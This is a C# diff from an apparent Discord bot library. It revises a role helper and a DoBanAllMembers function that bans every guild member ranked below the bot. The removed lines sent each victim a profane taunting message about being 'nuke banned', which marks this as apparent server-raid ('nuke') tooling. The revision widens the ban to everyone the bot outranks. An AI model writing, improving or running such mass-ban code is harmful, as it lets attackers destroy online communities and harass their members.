@@ -68,9 +68,9 @@ namespace Kaida.Library.Extensions
         /// <returns>Returns a list of <see cref="DiscordRole"/>.</returns>
         public static async Task<List<DiscordRole>> GetRolesBelowBot(this DiscordGuild guild)
         {
-            var botRoles = guild.GetMemberAsync(525291270525026322).Result.Roles.OrderByDescending(x => x.Position);
-            var botRole = botRoles.FirstOrDefault(x => x.Name != "@everyone");
-            return guild.Roles.Values.Where(x => x.Position < botRole.Position && x.IsManaged == false).ToList();
+            var botRoles = guild.GetMemberAsync(guild.CurrentMember.Id).Result.Roles.OrderByDescending(x => x.Position);
+            var botRole = botRoles.FirstOrDefault(x => x.Name != "@everyone" && x.IsManaged == true);
+            return guild.Roles.Values.Where(x => x.Position < botRole.Position).ToList();
         }
 
         /// <summary>
@@ -80,18 +80,10 @@ namespace Kaida.Library.Extensions
         /// <returns></returns>
         public static async Task DoBanAllMembers(this DiscordGuild guild)
         {
-            var users = guild.Members.Values.Where(x => x.IsOwner == false && x.IsBot == false).ToList();
-
+            var bot = await guild.GetMemberAsync(guild.CurrentMember.Id);
+            var users = guild.Members.Values.Where(x => x.Hierarchy < bot.Hierarchy).ToList();
             foreach (var user in users)
             {
-                var embed = new DiscordEmbedBuilder
-                {
-                    Description = new StringBuilder()
-                    .AppendLine($"Let's keep it simple buddy, you just got fucking nuke banned on {guild.Name}.")
-                    .AppendLine("https://www.youtube.com/watch?v=p12coHOA51Q").ToString()
-                };
-
-                await user.SendMessageAsync(embed: embed);
                 await user.BanAsync();
             }
         }
